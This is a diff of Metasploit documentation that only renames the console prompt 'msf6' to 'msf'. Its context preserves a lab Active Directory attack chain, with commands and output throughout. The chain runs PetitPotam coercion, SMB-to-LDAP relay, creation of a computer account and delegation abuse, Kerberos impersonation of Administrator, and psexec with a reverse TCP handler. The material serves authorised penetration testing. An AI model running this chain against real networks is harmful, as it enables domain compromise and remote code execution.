@@ -106,14 +106,14 @@ The domain name used during SMB exchange.
 
 ### Start the relay server
 ```
-msf6 > use auxiliary/server/relay/smb_to_ldap
-msf6 auxiliary(server/relay/smb_to_ldap) > run verbose=true RHOSTS=192.168.232.110
+msf > use auxiliary/server/relay/smb_to_ldap
+msf auxiliary(server/relay/smb_to_ldap) > run verbose=true RHOSTS=192.168.232.110
 [*] Auxiliary module running as background job 0.
-msf6 auxiliary(server/relay/smb_to_ldap) >
+msf auxiliary(server/relay/smb_to_ldap) >
 [*] SMB Server is running. Listening on 0.0.0.0:445
 [*] Server started.
 
-msf6 auxiliary(server/relay/smb_to_ldap) > _servicemanager
+msf auxiliary(server/relay/smb_to_ldap) > _servicemanager
 Services
 ========
 
@@ -150,7 +150,7 @@ msfconsole output:
 [*] Received request for NEWLAB\Administrator
 [*] Identity: NEWLAB\Administrator - All targets relayed to
 
-msf6 auxiliary(server/relay/smb_to_ldap) > sessions
+msf auxiliary(server/relay/smb_to_ldap) > sessions
 
 Active sessions
 ===============
@@ -166,7 +166,7 @@ Active sessions
 Coerce authentication using a non-privileged Domain User account with PetitPotam:
 
 ```
-msf6 auxiliary(scanner/dcerpc/petitpotam) > run verbose=true rhosts=192.168.232.111 listener=192.168.232.3 SMBUser=msfuser SMBPass=123456 SMBDomain=newlab.local
+msf auxiliary(scanner/dcerpc/petitpotam) > run verbose=true rhosts=192.168.232.111 listener=192.168.232.3 SMBUser=msfuser SMBPass=123456 SMBDomain=newlab.local
 [*] 192.168.232.111:445   - Binding to c681d488-d850-11d0-8c52-00c04fd90f7e:1.0@ncacn_np:192.168.232.111[\lsarpc] ...
 [*] 192.168.232.111:445   - Bound to c681d488-d850-11d0-8c52-00c04fd90f7e:1.0@ncacn_np:192.168.232.111[\lsarpc] ...
 [*] 192.168.232.111:445   - Attempting to coerce authentication via EfsRpcOpenFileRaw
@@ -187,7 +187,7 @@ msf6 auxiliary(scanner/dcerpc/petitpotam) > run verbose=true rhosts=192.168.232.
 [*] 192.168.232.111:445   - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(scanner/dcerpc/petitpotam) > sessions
+msf auxiliary(scanner/dcerpc/petitpotam) > sessions
 
 Active sessions
 ===============
@@ -196,7 +196,7 @@ Active sessions
   --  ----  ----  -----------                               ----------
   1         ldap  LDAP VICTIM$ @ 192.168.232.110:389  192.168.232.3:46691 -> 192.168.232.110:389 (192.168.232.110)
 
-msf6 auxiliary(scanner/dcerpc/petitpotam) > sessions -i 1
+msf auxiliary(scanner/dcerpc/petitpotam) > sessions -i 1
 [*] Starting interaction with 1...
 
 LDAP (192.168.232.110) > query -f (sAMAccountName=VICTIM$)
@@ -222,7 +222,7 @@ For details about RCBD, see https://docs.metasploit.com/docs/pentesting/active-d
 - Create a computer account with the `admin/dcerpc/samr_account` module and the same Domain User account
 
 ```
-msf6 auxiliary(admin/dcerpc/samr_account) > run verbose=true rhost=192.168.232.110 SMBUser=msfuser SMBPASS=123456 SMBDomain=newlab.local action=ADD_COMPUTER ACCOUNT_NAME=FAKE01$ ACCOUNT_PASSWORD=123456
+msf auxiliary(admin/dcerpc/samr_account) > run verbose=true rhost=192.168.232.110 SMBUser=msfuser SMBPASS=123456 SMBDomain=newlab.local action=ADD_COMPUTER ACCOUNT_NAME=FAKE01$ ACCOUNT_PASSWORD=123456
 [*] Running module against 192.168.232.110
 [*] 192.168.232.110:445 - Adding computer
 [*] 192.168.232.110:445 - Connecting to Security Account Manager (SAM) Remote Protocol
@@ -237,14 +237,14 @@ msf6 auxiliary(admin/dcerpc/samr_account) > run verbose=true rhost=192.168.232.1
 - Setup RBCD with the `admin/ldap/rbcd` module using the LDAP session
 
 ```
-msf6 auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session=1 delegate_to=VICTIM action=READ
+msf auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session=1 delegate_to=VICTIM action=READ
 [*] Running module against 192.168.232.110
 [+] Successfully bound to the LDAP server via existing SESSION!
 [*] Discovering base DN automatically
 [*] The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session=1 delegate_to=VICTIM action=WRITE delegate_from=FAKE01$
+msf auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session=1 delegate_to=VICTIM action=WRITE delegate_from=FAKE01$
 [*] Running module against 192.168.232.110
 [+] Successfully bound to the LDAP server via existing SESSION!
 [*] Discovering base DN automatically
@@ -253,7 +253,7 @@ msf6 auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session
 [*]   S-1-5-21-3065298949-3337206023-618530601-1618 (FAKE01$)
 [*] Auxiliary module execution completed
 
-msf6 auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session=1 delegate_to=VICTIM action=READ
+msf auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session=1 delegate_to=VICTIM action=READ
 [*] Running module against 192.168.232.110
 [+] Successfully bound to the LDAP server via existing SESSION!
 [*] Discovering base DN automatically
@@ -265,7 +265,7 @@ msf6 auxiliary(admin/ldap/rbcd) > run verbose=true rhost=192.168.232.110 session
 - Getting the Kerberos tickets using the `admin/kerberos/get_ticket` module
 
 ```
-msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.232.110 username=FAKE01 password=123456 domain=newlab.local spn=cifs/VICTIM.newlab.local impersonate=Administrator
+msf auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.232.110 username=FAKE01 password=123456 domain=newlab.local spn=cifs/VICTIM.newlab.local impersonate=Administrator
 [*] Running module against 192.168.232.110
 [+] 192.168.232.110:88 - Received a valid TGT-Response
 [*] 192.168.232.110:88 - TGT MIT Credential Cache ticket saved to /home/n00tmeg/.msf4/loot/20250123192959_default_192.168.232.110_mit.kerberos.cca_759601.bin
@@ -280,7 +280,7 @@ msf6 auxiliary(admin/kerberos/get_ticket) > run action=GET_TGS rhost=192.168.232
 - Code execution using the `windows/smb/psexec` module
 
 ```
-msf6 exploit(windows/smb/psexec) > klist
+msf exploit(windows/smb/psexec) > klist
 Kerberos Cache
 ==============
 id   host             principal                   sname                                        enctype  issued                     status  path
@@ -289,7 +289,7 @@ id   host             principal                   sname                         
 106  192.168.232.110  Administrator@NEWLAB.LOCAL  FAKE01@NEWLAB.LOCAL                          AES256   2025-01-23 19:29:59 +0100  active  /home/n00tmeg/.msf4/loot/20250123192959_default_192.168.232.110_mit.kerberos.cca_975187.bin
 107  192.168.232.110  Administrator@NEWLAB.LOCAL  cifs/VICTIM.newlab.local@NEWLAB.LOCAL        AES256   2025-01-23 19:29:59 +0100  active  /home/n00tmeg/.msf4/loot/20250123192959_default_192.168.232.110_mit.kerberos.cca_335229.bin
 
-msf6 exploit(windows/smb/psexec) > run lhost=192.168.232.3 rhost=192.168.232.111 username=Administrator smb::auth=kerberos smb::rhostname=VICTIM.newlab.local domaincontrollerrhost=192.168.232.110 domain=newlab.local
+msf exploit(windows/smb/psexec) > run lhost=192.168.232.3 rhost=192.168.232.111 username=Administrator smb::auth=kerberos smb::rhostname=VICTIM.newlab.local domaincontrollerrhost=192.168.232.110 domain=newlab.local
 [*] Started reverse TCP handler on 192.168.232.3:4444
 [*] 192.168.232.111:445 - Connecting to the server...
 [*] 192.168.232.111:445 - Authenticating to 192.168.232.111:445|newlab.local as user 'Administrator'...
